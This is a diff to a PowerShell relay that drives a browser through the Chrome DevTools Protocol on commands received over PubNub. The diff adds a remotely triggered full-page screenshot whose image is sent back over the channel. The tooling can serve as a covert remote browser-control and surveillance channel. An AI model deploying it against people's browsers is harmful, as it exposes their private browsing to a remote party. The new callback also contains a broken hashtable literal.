@@ -245,7 +245,8 @@ class PSCDPTarget {
     [bool]$attached
     [bool]$canAccessOpener
     [string]$browserContextId
-  
+    [string]$pid
+
     [string]$sessionId
 
     [byte[]]$pngBytes
@@ -347,6 +348,33 @@ $script:runtime_addBinding_callback = {
     $this.sendQueue.Add( @{ method="Runtime.evaluate"; params=$params; target=$target; callback=$script:runtime_evaluate_callback } )
 }
 
+# TODO: upload to bunny and send back download link
+$script:captureScreenshot_callback = {
+    param(
+        [object]$Response, [PSCDP]$cdpobj
+    )
+
+    $cmd = $Response.cmd
+    $target = $Response.cmd.target
+
+    $resultout = @{
+        builtincmd="GetTargetScreenCapture"
+        source="pscdp.relay.ps1"
+        destination=$cmd.source
+        cmdid=$cmd.cmdid
+        resultid=$(Get-Random -Minimum 10000000 -Maximum 99999999)
+        ts=$(Get-Timestamp)
+        result=$null
+        targetId=$target.targetId
+    }
+
+    $result = ${ imagedata=$Response.result.data }
+
+    $resultout['result'] = $result
+
+    $script:pubnubws.SendPBMessage($resultout)
+}
+
 function Transform-PSCustomObject($obj) {
     $ht = @{}
 
@@ -398,6 +426,7 @@ function Process-CDP {
     return $ret
 }
 
+# executes builtincmd
 function Process-PubNubEvent {
 
     param([string]$Message)
@@ -409,7 +438,6 @@ function Process-PubNubEvent {
             return
         }
     
-        
     } catch {
 
     }
@@ -439,7 +467,7 @@ function Process-PubNubEvent {
         ts=$(Get-Timestamp)
         result=$null
     }
-k
+
     if ( $cmd.builtincmd -eq "GetFrontendUrls" ) {
         $result = Get-FrontendUrls
     } elseif ( $cmd.builtincmd -eq "ProcessCDP" ) {
@@ -457,6 +485,32 @@ k
         #>
 
         $result = $ttargets
+    } elseif ( $cmd.builtincmd -eq "GetTargetScreenCapture" ) {
+        $targetId = $cmd.targetId
+
+        $target = $script:clientws.GetTarget($targetId)
+
+        $pbmsg = @{ 
+            method="Page.captureScreenshot"; 
+            params=@{ 
+                format="png"
+                quality=100
+                fromSurface=$true
+                captureBeyondViewport=$true
+            }; 
+            target=$target; 
+            callback=$script:captureScreenshot_callback 
+        }
+
+        try {
+            $script:clientws.AddQueue( $pbmsg )
+        } catch {
+            Log-Msg $_
+        }
+
+        Log-Msg "pass"
+
+        return
     }
 
     $resultout['result'] = $result
@@ -694,6 +748,12 @@ class PSCDP {
     [PSCDPCommand] GetCommand([string]$name) {
         $cmd = $this.commands | Where-Object { $_.name -eq $name } | Select-Object -First 1
         return $cmd
+    }
+
+    [PSCDPTarget] GetTarget($targetId) {
+        $target = $this.targets | Where-Object { $_.targetId -eq $targetId } | Select-Object -First 1
+
+        return $target
     }
 
     [object] GetResultByID($id) {
@@ -1032,8 +1092,9 @@ class PSCDP {
         }
 
         if ( $attachedToTarget ) { # update sessionId
-            
-            $targetInfo = [PSCDPTarget]$msg.params.targetInfo
+            $targetInfo = $msg.params.targetInfo
+            $targetInfo = [PSCDPTarget]::GetPSCustomObject($targetInfo)
+
             $targetInfo.sessionId = $sessionId
 
             $target = $this.targets | Where-Object { $_.targetId -eq $targetInfo.targetId } | Select-Object -First 1
@@ -1085,6 +1146,10 @@ class PSCDP {
 
         }
 
+    }
+
+    [void] AddQueue($msg) {
+        $this.sendQueue.Add( $msg )
     }
 
     [void] LoadQueue([PSCDPTarget]$target) {
